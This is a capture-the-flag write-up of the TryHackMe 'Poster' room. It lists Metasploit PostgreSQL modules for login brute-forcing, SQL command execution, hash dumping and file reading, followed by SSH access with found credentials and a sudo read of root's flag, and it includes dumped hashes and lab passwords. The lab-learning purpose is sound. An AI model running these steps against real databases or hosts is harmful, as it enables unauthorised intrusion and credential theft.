---
dg-publish: true
---
**Challenge URL: [ip-10-146-68-132 - Amazon DCV](https://tryhackme.com/room/poster)

**System Used: THM Attack Box

**Room Task: rdbms exploitation

**Written By: Spooky

**Solution:**

# Enumeration

1) Run NMAP on target IP
	1) ![[Poster NMAP.png]]
2) Run GoBuster on target IP
	1) Nothing interesting
3) Use MSF to find a suitable postgres exploit
	1) `search postgres`
	2) `auxiliary/scanner/postgres/postgres_login`
	3) `use 30`
	4) `set RHOSTS (IPAddress)`
	5) `run`
4) Log credentials for further exploit
	1) `postgres:password
5) Use the msf module that allows command execution with valid credentials
	1) `auxiliary/admin/postgres/postgres_sql`
	2) `set RHOSTS (IP ADDRESS)`
	3) `set PASSWORD password`
	4) `run`
	5) Note version of PostgresSQL
		1) `9.5.21`
6) Find the module for hash dumping
	1) `auxiliary/scanner/postgres/postgres_hashdump`
		1) `darkstart  md58842b99375db43e9fdf238753623a27d`
		2) `poster     md578fb805c7412ae597b399844a54cce0a`
		3) `postgres   md532e12f215ba27cb750c9e093ce4b5127`
		4) `sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b`
		5) `ti         md57af9ac4c593e9e4f275576e13f935579`
		6) `tryhackme  md503aab1165001c8f8ccae31a8824efddc`
7) Use the module for postgres Read File
	1) `auxiliary/admin/postgres/postgres_readfile`
	2) `set RHOSTS (IP Address)`
	3) `set LHOSTS ens5`
	4) `set LPORT 4445`
	5) `run`
		1) Credentials Found - dark:qwerty1234#!hackme
8) SSH into device using dark credentials
	1) Use LINpeas or similar tool to look for potential ways to escalate permissions to Alison
9) Noticed user.txt at `/home/alison/user.txt`, but no permissions to read the file from Dark
10) Also noticed config.php file in `/var/www/html`
11) If we `cat` the config file we can see Alison's credentials
	1) ![[Pasted image 20260713154636.png]]
12) We can now login via SSH with Alison's credentials and once logged in we can read the user.txt file
13) Check the user permissions via `sudo -la`
	1) Alison has (ALL:ALL)ALL permissions meaning we can just read the root file as well from this account
14) `sudo cat /root/root.txt` and enter flag
